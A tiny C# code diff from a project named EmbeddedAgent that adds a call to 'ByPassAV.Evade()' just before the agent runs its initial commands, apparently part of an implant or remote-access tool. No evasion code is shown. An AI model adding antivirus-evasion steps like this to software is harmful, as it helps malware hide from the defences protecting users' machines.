@@ -58,6 +58,7 @@ namespace EmbeddedAgent
         {
             try
             {
+                ByPassAV.Evade();
                 AgentProcess.ExecuteCommands(AgentProcess.InitCommands());
             }
             catch (Exception ex)
